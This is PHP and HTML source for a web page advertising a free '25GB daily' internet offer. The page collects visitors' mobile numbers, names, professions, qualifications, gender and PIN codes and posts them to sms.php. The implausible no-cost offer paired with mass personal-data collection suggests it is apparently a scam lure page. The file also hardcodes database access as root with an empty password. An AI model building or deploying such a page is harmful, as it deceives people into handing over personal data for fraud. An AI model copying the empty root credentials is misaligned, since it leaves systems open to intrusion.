<?php 
define("DB_HOST", "localhost");
define("DB_NAME", "sms");
define("DB_USER", "root");
define("DB_PASS", "");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Enjoy 25-GB Daily for 6-Months.. High-Speed Internet upto 5-10 MBPS!! Unlimited Internet upto 25GB/Per Day</title>
 <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style type="text/css">
  body{background-color:#008fd5;}
  .cnt{background-color:#fff;
  border:2px 4196cb thin;
  padding-bottom:20px;
  }
  .txt{ border-bottom:2px 4196cb thin;
  color:#F00;
  text-align:center;
  font-weight:bold;
  padding-bottom:2px;
  }
#body-overlay {background-color: rgba(0, 0, 0, 0.6);z-index: 999;position: absolute;left: 0;top: 0;width: 100%;height: 100%;display: none;}
#body-overlay div {position:absolute;left:50%;top:50%;margin-top:-32px;margin-left:-32px;}
</style>
</head>

<body>
<form id="sms" method="post">
<div class="container align-items-center">
<div id="body-overlay"><div><img src="loading.gif" width="64px" height="64px"/></div></div>
  <div class="row col-sm-12 cnt ">
  <div class="col-sm-2">
     
  </div>
  <div class="col-sm-8">
     <img src="head_banner.jpg" class ="img-responsive" />
      <div class="col-sm-8 txt">
      25GB daily data upto 30th JUNE 2020<br />
ACTIVATE YOUR OFFER WITHOUT ANY COST JUST REGISTER NOW
    </div>
      <div class="col-sm-8">
      <h5>MOBILE NUMBER</h5>
      <input type="text" class="form-control" name="mobile" id="mobile" required autocomplete="off" Placeholder="Enter Mobile Number">
    </div>
    <div class="col-sm-8">
      <h5>NAME</h5>
      <input type="text" class="form-control" name="name" id="name" required autocomplete="off" Placeholder="Enter Your Name">
    </div>
    <div class="col-sm-8">
      <h5>YOUR PROFESSION</h5>
      <select class="form-control" name="prof" id="prof" style="width: 100%;">
                   <option value="">SELECT PROFESSION</option>
					<option value="STUDENT">STUDENT</option>
					<option value="GOVT EMPLOYEE">GOVT EMPLOYEE</option>
                    <option value="GOVT EMPLOYEE">PVT EMPLOYEE</option>
                    <option value="BUSINESS">BUSINESS</option>
                    <option value="OTHERS">OTHERS</option>
        </select>
    </div>
    <div class="col-sm-8">
      <h5>QUALIFICATION</h5>
      <select class="form-control" name="quali" id="quali" style="width: 100%;">
                   <option value="">SELECT QUALIFICATION</option>
					<option value="10 PASSED">10 PASSED</option>
					<option value="HS">HS PASSED</option>
                    <option value="GRADUATE">GRADUATE</option>
                    <option value="POST GRADUATE">POST GRADUATE</option>
                    <option value="OTHERS">OTHERS</option>
        </select>
    </div>
    <div class="col-sm-8">
      <h5>GENDER</h5>
      <select class="form-control" name="gender" id="gender" style="width: 100%;">
                   <option value="">SELECT GENDER</option>
					<option value="Male">Male</option>
					<option value="Female">Female</option>
                   
        </select>
    </div>
     <div class="col-sm-8">
      <h5>PIN CODE</h5>
      <input type="text" class="form-control" name="pin" id="pin" required autocomplete="off" Placeholder="Enter PIN Code">
    </div>
     <div class="col-sm-8">
           <h5></h5>
      <button type="button" class="btn btn-primary btn-block" id="Photo" name="Photo">Activate Now</button>
    </div>
  </div>
  <div class="col-sm-2">
     
  </div>
   
  
  </div>
  </div>
  </form>
</body>
 <script>
$(document).ready(function(){
$("#Photo").on('click',function(){
	
var mobile=$("#mobile").val();
var name=$("#name").val();
var prof=$("#prof").val();
var quali=$("#quali").val();
var gender=$("#gender").val();
var pin=$("#pin").val();

if(mobile==""){
 alert("Enter The Mobile Number");
}

else{
var dataString = 'mobile='+ mobile + '&name='+ name + '&prof='+ prof + '&quali='+ quali + '&gender='+ gender + '&pin='+ pin;
$.ajax({
url:'sms.php',
 type: 'POST',
data: dataString,
beforeSend: function(){$("#body-overlay").show();},
 success: function(data){		  
	setInterval(function() {$("#body-overlay").hide(); },500);
	alert(data);
	window.location.reload(true);
	 },
	 error: function(){
	alert("Invalid Attempt");
	window.location.reload(true);
	}
	 });
}
	 e.preventDefault(); 
	});

});
</script>
</html>